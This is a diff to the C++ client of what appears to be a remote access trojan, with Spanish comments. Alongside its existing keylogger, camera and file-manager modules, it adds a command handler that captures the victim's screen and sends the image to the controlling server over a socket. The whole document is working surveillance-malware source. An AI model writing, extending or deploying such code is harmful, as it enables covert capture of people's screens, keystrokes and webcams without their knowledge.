@@ -3,6 +3,7 @@
 #include "mod_file_manager.hpp"
 #include "mod_keylogger.hpp"
 #include "mod_camara.hpp"
+#include "mod_remote_desktop.hpp"
 #include "misc.hpp"
 
 void Cliente::Init_Key() {
@@ -580,6 +581,42 @@ void Cliente::ProcesarComando(char* const& pBuffer, int iSize) {
             }
         }
         return;
+    }
+
+    //Escritorio Remoto
+    //Single
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::RD_Single) {
+        //Enviar solo una captura
+        if (!this->mod_RemoteDesk) {
+            this->mod_RemoteDesk = new mod_RemoteDesktop();
+        }
+        if (this->mod_RemoteDesk) {
+            strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
+            if (strIn.size() == 2) {
+                int iQuality = atoi(strIn[1].c_str());
+                std::vector<BYTE> vcDeskBuffer = this->mod_RemoteDesk->getFrameBytes(iQuality);
+                int iBufferSize = vcDeskBuffer.size();
+                if (iBufferSize > 0) {
+
+                    std::string strCommand = std::to_string(EnumComandos::RD_Salida);
+                    strCommand.append(1, CMD_DEL);
+                    int iHeadSize = strCommand.size();
+
+                    std::vector<BYTE> cBufferFinal(iBufferSize + iHeadSize);
+
+                    std::memcpy(cBufferFinal.data(), strCommand.c_str(), iHeadSize);
+                    std::memcpy(cBufferFinal.data() + iHeadSize, vcDeskBuffer.data(), iBufferSize);
+
+                    this->cSend(this->sckSocket, reinterpret_cast<const char*>(cBufferFinal.data()), iBufferSize + iHeadSize, 0, true, nullptr);
+
+                }
+                else {
+                    ;                DebugPrint("El buffer de remote_desk es 0");
+                }
+            } 
+        }else {
+            DebugPrint("No se pudo reservar memoria para el modulo de escritorio remoto");
+        }
     }
 
 }
